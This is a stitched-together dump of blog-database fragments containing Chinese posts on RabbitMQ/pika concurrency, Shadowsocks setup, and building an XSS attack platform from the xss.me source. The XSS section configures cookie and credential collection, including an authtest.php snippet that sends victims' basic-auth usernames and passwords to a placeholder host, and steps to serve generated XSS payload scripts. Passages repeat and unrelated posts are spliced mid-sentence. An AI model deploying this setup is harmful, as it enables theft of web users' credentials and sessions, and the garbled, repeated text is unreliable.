no_ack=False)\n```\n　　如果消息不确认，rabbitmq默认是没有超时时间的概念，即只要客户端连接不中断就会一直等待ack确认消息，那么此任务将会阻塞。针对这种情况，我们可以在程序中手动确认消息，即利用上面的代码。但如果程序在运行过程中出错，我们必须将此任务重新放回队列重新取出执行，则要用到channel.basic_nack(delivery_tag = method.delivery_tag)方法，可以实现将任务重新放回队列。\n#### 消息持久化存储\n　　虽然有了消息反馈机制，但是如果rabbitmq自身挂掉的话，那么任务还是会丢失。所以需要将任务持久化存储起来。\n```bash\nchannel.queue_declare(queue='hello', durable=True)\n但是这个程序会执行错误，因为hello这个队列已经存在，并且是非持久化的，rabbitmq不允许使用不同的参数来重新定义存在的队列。重新定义一个队列：\nchannel.queue_declare(queue='task_queue', durable=True)\n在发送任务的时候，用delivery_mode=2来标记任务为持久化存储：\nchannel.basic_publish(exchange='',\n                      routing_key=\"task_queue\",\n                      body=message,\n                      properties=pika.BasicProperties(\n                         delivery_mode = 2, # make message persistent\n                      ))\n```\n#### 公平调度\n　　上面实例中，虽然每个工作者是依次分配到任务，但是每个任务不一定一样。可能有的任务比较重，执行时间比较久；有的任务比较轻，执行时间比较短。如果能公平调度就最好了，使用basic_qos设置prefetch_count=1，使得rabbitmq不会在同一时间给工作者分配多个任务，即只有工作者完成任务之后，才会再次接收到任务。\n```bash\nchannel.basic_qos(prefetch_count=1)\n```\n### pika vs celery\n　　celery用来分配任务的，主要是做异步任务队列的。\n　　pika+rabbitmq主要是用来消息的收发功能，并不带有任务分配功能。比如说我们有很多台机器需要去rabbitmq服务器消息队列中取任务，任务怎么分配，pika应该做不到。pika只能做到消息的发送，以及消息的获取。又或者说pika其实就是用来使用rabbitmq的一个客户端，本身只是消息存储功能，并没有任务的分配等。如果需要此功能，就需要理由pika模块自己写一个调度方案，相当于自己写一个celery模块。\n\n### Rabbitmq任务调度问题\n首先，Rabbitmq任务调度应该是阻塞的，看代码：\n```bash\nimport pika\nimport time\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    #ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_qos(prefetch_count=10) #最多只会让消费者同时做10个任务\nchannel.basic_consume(callback, queue='hello')\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n运行结果：每隔1s输出一个hello world，输出10个后停止。\n\n　　我们把ch.basic_ack(delivery_tag = method.delivery_tag)注释去掉，再运行.\n　　每隔1s输出一个hello world ，不会停止。可以看到的是prefetch_count=10，也就是说可以同时执行10个任务，然而结果是并没有并发执行，而是单线程执行的，也就是说是一个任务一个任务执行的。\n　　ch.basic_ack(delivery_tag = method.delivery_tag)的作用在于告诉队列，单个任务已经执行完，也就是说如果不回复，那么队列认为此任务还没做完，累计到10个任务后，达到了同时执行的最大任务量，因此便不会再下派任务。\n\n　　那么加上消息确认，为何也没有达到10个任务并发执行呢？\n\n　　我的猜想是，rabbitmq本身并不是异步的（是阻塞的），也没有并发的功能，想要实现并发，需要自己写程序解决。修改代码，我们再看看.\n```bash\nimport pika\nimport time\nimport threading\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    t=threading.Thread(target=test,args=(ch,method,body)) #多线程\n    t.start()\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_qos(prefetch_count=2) #最多只会让消费者同时做10个任务\nchannel.basic_consume(callback, queue='hello')\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n运行结果：每隔1s，并发输出2个hello world，确实达到了并发的效果，然后并发的数量取决于prefetch_count=2的设置。\n\n　　那么我们可以得出结论，从rabbitmq队列取出数据本身是阻塞的，没有达到并发，但是通过设置prefetch_count=2以及编写多线程函数，还是可以达到并发的效果。（prefetch_count 不设置，默认应该是没有上限）\n\n### Rabbitmq并发调度问题\nRabbitmq取任务本身不是并发的，但可以结合多线程、协程、多进程达到并发的效果。\n\n@更新于2017年5月9日：\n*以下并发方式并不适用于pika，因为其在一个blocking_connection中不支持并发，这里当做错误示范保留。如果需要并发，可以把多线程写在每个连接外面，即每个线程都去连接队列，达到并发收取队列任务的效果。*\n\n#### 多线程\n代码：\n```bash\nimport pika\nimport time\nimport threading\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    t=threading.Thread(target=test,args=(ch,method,body))\n    t.start()\n\nchannel.basic_qos(prefetch_count=2)\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n　　代码中定义的回调函数是一个多线程启动器，任务发给回调函数，回调函数会将它以多线程的形式传递给test函数，执行输出。并发的数量取决于prefetch_count=2，这代表同时执行任务的最大数量。\n\n#### 协程\n代码：\n```bash\nimport pika\nimport time\nimport gevent\nfrom gevent import monkey;monkey.patch_all()\n\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    gevent.spawn(test,ch,method,body) #协程启动，没有调用join，因为rabbitmq本身是阻塞的,可以不用join\n\nchannel.basic_qos(prefetch_count=2) #并发的数量\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n#### 多进程\n代码：（只能在linux下使用）\n```bash\nimport pika\nimport time\nfrom multiprocessing import Process\n\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    t=Process(target=test,args=(ch,method,body))\n    t.start()\n\nchannel.basic_qos(prefetch_count=2) #并发的进程数量\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n\n*本文所写内容，均为本人测试后所得，如有错误，欢迎指正，谢谢！*\n\n>转载请说明出处:[RabbitMQ |

-->\n### Install shadowsocks Server\n搭建shadowsocks服务端，分别介绍windows与linux下搭建方法。\n#### Windows\n先安装python，然后再利用pip安装shadowsocks.\n```bash\npip install shadowsocks\n```\n然后创建一个文件，如：config.json\n```bash\n{\n\"server\":\"\",     ##服务器ip地址\n\"server_port\":8000,  ##代理端口\n\"local_address\":\"127.0.0.1\",\n\"local_port\":1080, ##本地监听端口\n\"password\":\"\",   ##连接密码\n\"timeout\":300,\n\"method\":\"aes-256-cfb\", ##加密方式\n\"dast_open\":false\n}\n```\n填写完以后，在cmd里运行：\n```bash\nssserver -c config.json\n```\n如果没有报错的话，shadowsocks服务端就已经搭建好了。\n\n#### Linux\n##### Install\n与windows的类似，先通过pip安装shadowsocks.\n```bash\nsudo apt-get install  python-pip\nsudo apt-get install python-m2crypto\nsudo pip install  shadowsocks\n```\n##### 配置config文件\n```bash\nmkdir /etc/shadowsocks\nvim /etc/shadowsocks/config.json （一定要在这个目录下）\n```\n写入：(ip也可以写内网地址，只要能转发出来即可。)\n单用户配置：\n```bash\n{\n\"server\":\"\",  \n\"server_port\":8000,\n\"local_address\":\"127.0.0.1\",\n\"local_port\":1080,\n\"password\":\"\",\n\"timeout\":300,\n\"method\":\"aes-256-cfb\",\n\"fast_open\":false\n}\n```\n多用户配置：\n```bash\n{\n\"server\":\"\",\n\"local_address\":\"127.0.0.1\",\n\"local_port\":1080,\n\"port_password\":{\n\"8000\":\"123456\",\n\"8001\":\"123456\"\n},\n\"timeout\":300,\n\"method\":\"aes-256-cfb\",\n\"fast_open\":false\n}\n```\n##### 命令行启动关闭\n```bash\nssserver -c /etc/shadowsocks/config.json -d start 后台启动\nssserver -c /etc/shadowsocks/config.json -d stop 后台停止\n```\n##### 设置开机启动\n将启动的命令加入到/etc/rc.local文件的最后\n```bash\nvi /etc/rc.local\n```\n##### 设置非root用户运行ss\n```bash\nsudo useradd ssuser //添加一个ssuser用户\nsudo ssserver [other options] --user ssuser //用ssuser这个用户来运行ss\n```\n将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start --user ssuser\n\n### Install shadowsocks Client\n安装shadowsock客户端我也分为windows与Linux两种情况进行介绍。\n\n#### Windows\nwindows安装shadowsocks客户端比较简单，直接下载安装程序。\n启动以后，填入服务端相应的配置（ip，port，密码，加密方式）\n设置模式：\n![](/upload_image/20170222/1.png)\n![](/upload_image/20170222/2.png)\n推荐使用PAC模式。\n\n#### Linux\n*此次主要花费的时间就在于linux上搭建shadowsocks客户端，坑不少（~主要是自己脑子有点晕~）*\n##### Install\n安装同样简单：\n```bash\npip install shadowsocks\n```\n##### 配置condfig\n配置也很简单，创建一个shadowsocks.json文件：\n```bash\n{\n\"server\":\"\",\n\"server_port\":8000,\n\"local_port\":1080,\n\"password\":\"\",\n\"timeout\":600,\n\"method\":\"aes-256-cfb\"\n}\n```\n内容类似上面，然后在命令行中运行：sslocal -c shadowsocks.json 此时系统会监听本地的1080端口。\n\n##### socks转http代理问题\n　　此时不是GUI窗口，只是一个命令行，怎么用curl等命令走http代理（网上资料大部分是设置浏览器，但不适合本文），原本可以用其他方案解决，但此时偏偏选择了shadowsocks，就只能一路走下去了。等一切都安装好，启动完以后，我发现http代理仍然用不了，然后就开始了心力憔悴的调试，搞了半天也还是用不了，最终同事发现了问题（socks代理需要转化为http代理，windows可以设置浏览器，linux需要下载工具转化）。\n　　发现了原因所在，那么现在的问题是怎么讲socks代理转化为http代理？\n\n##### socks转http代理方案\n* proxychains 可以自动将socks代理转化为http代理。\n* polipo      用这个工具将socks代理转化为http代理。\n\n##### proxychains\n安装：\n```bash\ngit clone https://github.com/haad/proxychains\n./configure\nmake\nsudo make install\n```\n配置：\n修改配置文件proxychains.conf\n```bash\n将socks4 127.0.0.1 9095改为socks5  127.0.0.1 1080  //1080改为你自己的端口\n```\n使用：\n```bash\nproxychains curl http://thief.one\n```\n详情参考：[http://www.tuicool.com/articles/rUNFF3](http://www.tuicool.com/articles/rUNFF3)\n##### polipo\n安装：\n```bash\nsudo apt-get install polipo\n```\n配置：\n停止polipo服务 sudo service polipo stop\n编辑polipo配置文件/etc/polipo/config，添加如下内容：\n```bash\nsocksParentProxy = localhost:1080\nproxyPort = 1081\n```\n启动polipo服务 sudo service polipo start\n\n使用：\n* app里面配置http_proxy=http://127.0.0.1:1081\n* bash里面可以编辑$HOME/.bashrc，添加export http_proxy=http://127.0.0.1:1081　导出环境变量。当前bash要执行source $HOME/.bashrc来使配置文件生效。\n* git配置git config --global http.proxy 127.0.0.1:1081\n\n详情参考：[http://blog.csdn.net/zcq8989/article/details/50545078](http://blog.csdn.net/zcq8989/article/details/50545078)\n\n\n\n","source":"_posts/Shadowsocks折腾记.md","raw":"---\ntitle:

Install\n与windows的类似，先通过pip安装shadowsocks.\n```bash\nsudo apt-get install  python-pip\nsudo apt-get install python-m2crypto\nsudo pip install  shadowsocks\n```\n##### 配置config文件\n```bash\nmkdir /etc/shadowsocks\nvim /etc/shadowsocks/config.json （一定要在这个目录下）\n```\n写入：(ip也可以写内网地址，只要能转发出来即可。)\n单用户配置：\n```bash\n{\n\"server\":\"\",  \n\"server_port\":8000,\n\"local_address\":\"127.0.0.1\",\n\"local_port\":1080,\n\"password\":\"\",\n\"timeout\":300,\n\"method\":\"aes-256-cfb\",\n\"fast_open\":false\n}\n```\n多用户配置：\n```bash\n{\n\"server\":\"\",\n\"local_address\":\"127.0.0.1\",\n\"local_port\":1080,\n\"port_password\":{\n\"8000\":\"123456\",\n\"8001\":\"123456\"\n},\n\"timeout\":300,\n\"method\":\"aes-256-cfb\",\n\"fast_open\":false\n}\n```\n##### 命令行启动关闭\n```bash\nssserver -c /etc/shadowsocks/config.json -d start 后台启动\nssserver -c /etc/shadowsocks/config.json -d stop 后台停止\n```\n##### 设置开机启动\n将启动的命令加入到/etc/rc.local文件的最后\n```bash\nvi /etc/rc.local\n```\n##### 设置非root用户运行ss\n```bash\nsudo useradd ssuser //添加一个ssuser用户\nsudo ssserver [other options] --user ssuser //用ssuser这个用户来运行ss\n```\n将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start --user ssuser\n\n### Install shadowsocks Client\n安装shadowsock客户端我也分为windows与Linux两种情况进行介绍。\n\n#### Windows\nwindows安装shadowsocks客户端比较简单，直接下载安装程序。\n启动以后，填入服务端相应的配置（ip，port，密码，加密方式）\n设置模式：\n![](/upload_image/20170222/1.png)\n![](/upload_image/20170222/2.png)\n推荐使用PAC模式。\n\n#### Linux\n*此次主要花费的时间就在于linux上搭建shadowsocks客户端，坑不少（~主要是自己脑子有点晕~）*\n##### Install\n安装同样简单：\n```bash\npip install shadowsocks\n```\n##### 配置condfig\n配置也很简单，创建一个shadowsocks.json文件：\n```bash\n{\n\"server\":\"\",\n\"server_port\":8000,\n\"local_port\":1080,\n\"password\":\"\",\n\"timeout\":600,\n\"method\":\"aes-256-cfb\"\n}\n```\n内容类似上面，然后在命令行中运行：sslocal -c shadowsocks.json 此时系统会监听本地的1080端口。\n\n##### socks转http代理问题\n　　此时不是GUI窗口，只是一个命令行，怎么用curl等命令走http代理（网上资料大部分是设置浏览器，但不适合本文），原本可以用其他方案解决，但此时偏偏选择了shadowsocks，就只能一路走下去了。等一切都安装好，启动完以后，我发现http代理仍然用不了，然后就开始了心力憔悴的调试，搞了半天也还是用不了，最终同事发现了问题（socks代理需要转化为http代理，windows可以设置浏览器，linux需要下载工具转化）。\n　　发现了原因所在，那么现在的问题是怎么讲socks代理转化为http代理？\n\n##### socks转http代理方案\n* proxychains 可以自动将socks代理转化为http代理。\n* polipo      用这个工具将socks代理转化为http代理。\n\n##### proxychains\n安装：\n```bash\ngit clone https://github.com/haad/proxychains\n./configure\nmake\nsudo make install\n```\n配置：\n修改配置文件proxychains.conf\n```bash\n将socks4 127.0.0.1 9095改为socks5  127.0.0.1 1080  //1080改为你自己的端口\n```\n使用：\n```bash\nproxychains curl http://thief.one\n```\n详情参考：[http://www.tuicool.com/articles/rUNFF3](http://www.tuicool.com/articles/rUNFF3)\n##### polipo\n安装：\n```bash\nsudo apt-get install polipo\n```\n配置：\n停止polipo服务 sudo service polipo stop\n编辑polipo配置文件/etc/polipo/config，添加如下内容：\n```bash\nsocksParentProxy = localhost:1080\nproxyPort = 1081\n```\n启动polipo服务 sudo service polipo start\n\n使用：\n* app里面配置http_proxy=http://127.0.0.1:1081\n* bash里面可以编辑$HOME/.bashrc，添加export http_proxy=http://127.0.0.1:1081　导出环境变量。当前bash要执行source $HOME/.bashrc来使配置文件生效。\n* git配置git config --global http.proxy 127.0.0.1:1081\n\n详情参考：[http://blog.csdn.net/zcq8989/article/details/50545078](http://blog.csdn.net/zcq8989/article/details/50545078)\n\n\n\n","slug":"Shadowsocks折腾记","published":1,"updated":"2017-04-10T11:52:04.327Z","layout":"post","photos":[],"link":"","_id":"cj2mmx2xp002gnklijuqeenub","content":"<p><blockquote

class=\"blockquote-center\">每天把牢骚拿出来晒晒太阳，心情就不会缺钙</blockquote>\n\n　　之前搭建过很多次xss平台，也用过几套源代码，然而对比之下，还是觉得wuyun的xss.me源码比较好用，即使比较古老了。最近因为工作需要，又准备重新搭建一套xss平台，源码果断选择了xss.me（当然是经过修改之后的），我的源码来之博客:[http://www.bodkin.ren/?p=133](http://www.bodkin.ren/?p=133)，感谢其分享。\n<!--more -->\n　　Xss平台的搭建过程并不复杂，虽然期间遇到了一些小问题，但也很快解决了，在此记录分享。\n\n### xss源码下载\n　　[修改版](https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip)\n　　[原版](https://git.oschina.net/nMask/Resource/raw/master/xss.me.old.zip)\n\n### Install\n\n　　首先下载xssplatform源码，然后选择一台服务器安装wamp，这里之所以选择wamp来搭建环境，主要是想免去配置apache、mysql的麻烦，因为本文重点还是在于搭建xss平台的过程。（大神可以选择在linux上单独安装配置apache）\n\n　　服务器环境配置好以后，将xss源码放在wamp的www目录下，启动wamp，此时如果wamp运行正常，我们打开localhost/xss/应该可以看到登陆界面了，但此时还不能进行登陆或者注册，还需要进行多项配置。\n\n### apache配置\n\n　　打开wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf，为了后面搭建xss平台不出现错误，我们先将网站目录设置一下：\n```bash\n将其中的c:/wamp/www/ 改为c:/wamp/www/xss/，重启apache。\n```\n　　这时打开localhost就可以看到登陆页面了，而不需要访问localhost/xss/路径。当然如果有特殊需要，必须设置二级目录的，那之后的一些路径配置，请都设置成二级目录，即在原来的路径前面加上目录名称，如/xss/index.php等。\n\n### 数据库配置\n　　打开localhost/phpmyadmin进入phpmyadmin管理界面，添加一个用户root,123456,为了安全起见，删除其他用户。然后添加一个数据库，名为poppy（具体数据库名称可查看xss.sql文件，里面有写），然后导入xss.sql文件即可。\n　　更改oc_module模块域名，进入oc_module表，执行sql语句，改为自己的域名。（影响生成的xss poc）\n```bahs\nUPDATE oc_module SET code=REPLACE(code,\"http://xsser.me\",\"http://xxx.com\");\n```\n### Xss源码配置\n\napache与数据库配置完以后，还需要配置xss源码。\n\n#### config.php\n\n打开根目录下的config.php文件，主要看以下这些配置。\n```bash\n/* 数据库连接 */\n$config['dbHost']        ='localhost';            //数据库地址\n$config['dbUser']        ='root';                //用户\n$config['dbPwd']        ='123456';                //密码\n$config['database']        ='poppy';            //数据库名\n$config['charset']        ='utf8';                //数据库字符集\n$config['tbPrefix']        ='oc_';                    //表名前缀\n$config['dbType']        ='mysql';                //数据库类型(目前只支持mysql)\n\n/* 注册配置 */\n$config['register']        ='invite';                //normal,正常;invite,只允许邀请注册;close,关闭注册功能\n$config['mailauth']        =false;                    //注册时是否邮箱验证\n\n/* url配置 */\n$config['urlroot']        ='http://localhost';//访问的url起始\n```\n修改配置如下：\n\n* $config['database']        ='poppy';  #更改，保持跟数据名一致（数据库名字查看.sql文件）\n* 数据库账号密码可以选择更改，也可以保持不变。\n* $config['register']          ='normal';             # 改为不需要邀请码。\n* $config['urlroot']        ='http://localhost'; #改为本地\n\n#### 修改authtest.php\n\n修改根目录下authtest.php文件，改成自己的域名或者ip。\n```bash\n else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){\n\n    /* 变量值存在，检查其是否正确 */\n\n    header(\"Location: http://xxx.com/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}\"); \n}\n```\n　　修改完配置以后，打开localhost，注册一个账号。注册完成后oc_user表中会新增一个记录，手动将adminlevel改为1（即管理员权限，可以有权限下放邀请码）。\n\n完成以上步骤，平台差不多就可以用了，但如果遇到了一些其他问题，请继续往下看。\n\n### Xss_Url 404问题\n\n出现的问题：当访问\n```bash\nhttp://xxx.com/y42f59?1489555427\n```\n等自动生成的xss_poc时，会出现404错误，这是由于url重写没有生效的缘故，主要是因为中间件配置问题。以下就apache与iis中间件，给出解决方案。\n#### apache解决方案\n\n首先在网站根目录添加.htaccess文件，文件内容如下：\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^([0-9a-zA-Z]{6})$ /index.php?do=code&urlKey=$1 [L]\nRewriteRule ^do/auth/(\\w+?)(/domain/([\\w\\.]+?))?$  /index.php?do=do&auth=$1&domain=$3 [L]\nRewriteRule ^register/(.*?)$ /index.php?do=register&key=$1 [L]\nRewriteRule ^register-validate/(.*?)$ /index.php?do=register&act=validate&key=$1 [L]\n</IfModule>\n```\n注意：如果网站需要域名+目录去访问的，如：www.xxx.com/xss/，则在以下代码/index.php前添加/xss/index.php。\n\n然后修改apache配置文件，允许url重写。\n```bash\nAllowOverride None\n```\n全部改为\n```bash\nAllowOverride All\n```\n这样，apache会根据根目录下的.htaccess文件去匹配url重写规则。\n\n做完以上2条配置后访问类似于此地址，就会显示xss_poc（js）内容了。\n```bash\nhttp://xxx.com/y42f59?1489555427\n```\n写文本时，我是在windows下做的测试，linux下配置方法应当一致。\n\n#### iis解决方案\n\n参考：[http://www.bodkin.ren/?p=133](http://www.bodkin.ren/?p=133)\n\n### 邮件短信设置\n\n* 修改文件\\source\\function.php 257行,把里面的邮箱账号密码换一下，host改为smtp.xx.com，如：smtp.qq.com\n* 飞信短信提醒功能，修改\\source\\api.php 72行手机号，可能只支持移动手机号。\n\n### 老版本其他问题\n\n*新的源码不需要修改以下参数，老版本可能需要修改*\n\n#### 修改注册页面提交按钮\n\n修改themes\\default\\templates\\register.html内容：\n```bash\n<input id=\"btnRegister\" type=\"button\" onclick=\"Register()\" value=\"提交注册\" />\n```\n修改为\n```bash\n<input id=\"btnRegister\" type=\"submit\" value=\"提交注册\" />\n```\n\n#### 邀请码生成\n\n（1）将文件source\\user.php第10行和50行的权限控制注释掉\n```bash\n//if($user->userId<=0) ShowError('未登录或已超时',$url['login'],'重新登录');\n//if($user->adminLevel<=0) ShowError('没有操作权限',URL_ROOT.'/index.php?do=user&act=invite');\n```\n然后访问/index.php?do=user&act=invite即可生成验证码\n（2）注册一个用户test，进入数据库，将该用户的adminLevel修改为1，然后去掉（1）中添加到注释；并在第15行case 'invite':处添加权限控制：\n```bash\nif($user->adminLevel<=0) ShowError('没有操作权限',URL_ROOT.'/index.php');\n```\n（3）或者开放普通注册权限，修改文件/config.php的第18行\n```bash\n$config['register']='invite';   //normal,正常;invite,只允许邀请注册;close,关闭注册功能\n ```\n#### 删除cookie\n\n　　修改文件themes\\default\\templates\\project_view.html中的Delete()和MultiDelete()函数，将其中post的URL修改为\n```bash\n'/xss/index.php?do=project&act=delcontent&r='\n```\n即根据实际的服务器路径，在前面添加'/xss'。\n \n#### source\\class\\user.class.php\n```bash\n$this->db->Execute(\"UPDATE \".$this->tbUser.\" SET loginTime='\".time().\"'\");\n修改为\n$this->db->Execute(\"UPDATE \".$this->tbUser.\" SET loginTime='\".time().\"' where id={$row['id']}\");\n```\n#### 修改跳转提示时间\n文件themes/default/templates/notice.html：\n```bash\nsetTimeout(\"location.href='{$notice.turnto}'\",3000);\n修改为\nsetTimeout(\"location.href='{$notice.turnto}'\",500);\n```\n\n\n本文地址：[http://thief.one/2017/03/15/Xss平台搭建小记/](http://thief.one/2017/03/15/Xss平台搭建小记/)\n转载请说明来自：[nMask'Blog](http://thief.one)","source":"_posts/Xss平台搭建小记.md","raw":"---\ntitle:

$config['database']        ='poppy';  #更改，保持跟数据名一致（数据库名字查看.sql文件）\n* 数据库账号密码可以选择更改，也可以保持不变。\n* $config['register']          ='normal';             # 改为不需要邀请码。\n* $config['urlroot']        ='http://localhost'; #改为本地\n\n#### 修改authtest.php\n\n修改根目录下authtest.php文件，改成自己的域名或者ip。\n```bash\n else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){\n\n    /* 变量值存在，检查其是否正确 */\n\n    header(\"Location: http://xxx.com/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}\"); \n}\n```\n　　修改完配置以后，打开localhost，注册一个账号。注册完成后oc_user表中会新增一个记录，手动将adminlevel改为1（即管理员权限，可以有权限下放邀请码）。\n\n完成以上步骤，平台差不多就可以用了，但如果遇到了一些其他问题，请继续往下看。\n\n### Xss_Url 404问题\n\n出现的问题：当访问\n```bash\nhttp://xxx.com/y42f59?1489555427\n```\n等自动生成的xss_poc时，会出现404错误，这是由于url重写没有生效的缘故，主要是因为中间件配置问题。以下就apache与iis中间件，给出解决方案。\n#### apache解决方案\n\n首先在网站根目录添加.htaccess文件，文件内容如下：\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^([0-9a-zA-Z]{6})$ /index.php?do=code&urlKey=$1 [L]\nRewriteRule ^do/auth/(\\w+?)(/domain/([\\w\\.]+?))?$  /index.php?do=do&auth=$1&domain=$3 [L]\nRewriteRule ^register/(.*?)$ /index.php?do=register&key=$1 [L]\nRewriteRule ^register-validate/(.*?)$ /index.php?do=register&act=validate&key=$1 [L]\n</IfModule>\n```\n注意：如果网站需要域名+目录去访问的，如：www.xxx.com/xss/，则在以下代码/index.php前添加/xss/index.php。\n\n然后修改apache配置文件，允许url重写。\n```bash\nAllowOverride None\n```\n全部改为\n```bash\nAllowOverride All\n```\n这样，apache会根据根目录下的.htaccess文件去匹配url重写规则。\n\n做完以上2条配置后访问类似于此地址，就会显示xss_poc（js）内容了。\n```bash\nhttp://xxx.com/y42f59?1489555427\n```\n写文本时，我是在windows下做的测试，linux下配置方法应当一致。\n\n#### iis解决方案\n\n参考：[http://www.bodkin.ren/?p=133](http://www.bodkin.ren/?p=133)\n\n### 邮件短信设置\n\n* 修改文件\\source\\function.php 257行,把里面的邮箱账号密码换一下，host改为smtp.xx.com，如：smtp.qq.com\n* 飞信短信提醒功能，修改\\source\\api.php 72行手机号，可能只支持移动手机号。\n\n### 老版本其他问题\n\n*新的源码不需要修改以下参数，老版本可能需要修改*\n\n#### 修改注册页面提交按钮\n\n修改themes\\default\\templates\\register.html内容：\n```bash\n<input id=\"btnRegister\" type=\"button\" onclick=\"Register()\" value=\"提交注册\" />\n```\n修改为\n```bash\n<input id=\"btnRegister\" type=\"submit\" value=\"提交注册\" />\n```\n\n#### 邀请码生成\n\n（1）将文件source\\user.php第10行和50行的权限控制注释掉\n```bash\n//if($user->userId<=0) ShowError('未登录或已超时',$url['login'],'重新登录');\n//if($user->adminLevel<=0) ShowError('没有操作权限',URL_ROOT.'/index.php?do=user&act=invite');\n```\n然后访问/index.php?do=user&act=invite即可生成验证码\n（2）注册一个用户test，进入数据库，将该用户的adminLevel修改为1，然后去掉（1）中添加到注释；并在第15行case 'invite':处添加权限控制：\n```bash\nif($user->adminLevel<=0) ShowError('没有操作权限',URL_ROOT.'/index.php');\n```\n（3）或者开放普通注册权限，修改文件/config.php的第18行\n```bash\n$config['register']='invite';   //normal,正常;invite,只允许邀请注册;close,关闭注册功能\n ```\n#### 删除cookie\n\n　　修改文件themes\\default\\templates\\project_view.html中的Delete()和MultiDelete()函数，将其中post的URL修改为\n```bash\n'/xss/index.php?do=project&act=delcontent&r='\n```\n即根据实际的服务器路径，在前面添加'/xss'。\n \n#### source\\class\\user.class.php\n```bash\n$this->db->Execute(\"UPDATE \".$this->tbUser.\" SET loginTime='\".time().\"'\");\n修改为\n$this->db->Execute(\"UPDATE \".$this->tbUser.\" SET loginTime='\".time().\"' where id={$row['id']}\");\n```\n#### 修改跳转提示时间\n文件themes/default/templates/notice.html：\n```bash\nsetTimeout(\"location.href='{$notice.turnto}'\",3000);\n修改为\nsetTimeout(\"location.href='{$notice.turnto}'\",500);\n```\n\n\n本文地址：[http://thief.one/2017/03/15/Xss平台搭建小记/](http://thief.one/2017/03/15/Xss平台搭建小记/)\n转载请说明来自：[nMask'Blog](http://thief.one)","slug":"Xss平台搭建小记","published":1,"updated":"2017-04-10T11:52:04.342Z","layout":"post","photos":[],"link":"","_id":"cj2mmx2y1002znkliuz5l8b9t","content":"<blockquote

title=\"Install\"></a>Install</h3><p>　　首先下载xssplatform源码，然后选择一台服务器安装wamp，这里之所以选择wamp来搭建环境，主要是想免去配置apache、mysql的麻烦，因为本文重点还是在于搭建xss平台的过程。（大神可以选择在linux上单独安装配置apache）</p>\n<p>　　服务器环境配置好以后，将xss源码放在wamp的www目录下，启动wamp，此时如果wamp运行正常，我们打开localhost/xss/应该可以看到登陆界面了，但此时还不能进行登陆或者注册，还需要进行多项配置。</p>\n<h3 id=\"apache配置\"><a href=\"#apache配置\" class=\"headerlink\" title=\"apache配置\"></a>apache配置</h3><p>　　打开wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf，为了后面搭建xss平台不出现错误，我们先将网站目录设置一下：<br><figure

改为c:/wamp/www/xss/，重启apache。</div></pre></td></tr></table></figure></p>\n<p>　　这时打开localhost就可以看到登陆页面了，而不需要访问localhost/xss/路径。当然如果有特殊需要，必须设置二级目录的，那之后的一些路径配置，请都设置成二级目录，即在原来的路径前面加上目录名称，如/xss/index.php等。</p>\n<h3 id=\"数据库配置\"><a href=\"#数据库配置\" class=\"headerlink\"

